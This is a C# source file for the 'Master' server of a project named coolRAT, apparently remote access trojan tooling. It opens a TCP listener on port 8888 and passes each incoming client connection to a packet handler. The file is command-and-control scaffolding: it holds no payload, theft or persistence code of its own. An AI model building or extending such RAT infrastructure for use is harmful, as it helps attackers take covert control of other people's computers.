using coolRAT.Libs;
using coolRAT.Libs.Packets;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace coolRAT.Master
{
    class Program
    {
        static void Main(string[] args)
        {
            MasterListener.RunInit(new ConnectionSettings(8888));
            Console.WriteLine("-- Master Server running");
            Console.ReadLine();
        }
    }

    public static class MasterListener
    {
        public static TcpListener ConnectionListener;
        public static Dictionary<Guid, Client> ConnectedClients;
        public static Action MainLoopTask;

        public static bool MainLoopAbort;
        public static ConnectionSettings Settings;

        public static void RunInit(ConnectionSettings settings)
        {
            Settings = settings;
            RunInit();
        }

        public static void RunInit()
        {
            if (Settings.IsEmpty())
                throw new ArgumentNullException(nameof(Settings));
            ConnectedClients = new Dictionary<Guid, Client>();
            ConnectionListener = new TcpListener(new IPEndPoint(IPAddress.Any, Settings.Port));
            ConnectionListener.Start();
            MainLoopTask = new Action(() =>
            {
                while (!MainLoopAbort)
                {
                    try
                    {
                        TcpConnection conn = (TcpConnection)ConnectionListener.AcceptTcpClient();
                        Console.WriteLine("[MasterListener] accept connection");
                        // Spawn a new PacketListenerLoop
                        PacketListenerLoop.Spawn(conn, new Server_PacketHandler(conn));
                        
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.Message);
                    }
                }
            });
            MainLoopAbort = false;
            //Run
            Task.Run(MainLoopTask);
            Console.WriteLine("Listening for connections...");
        }
    }
}
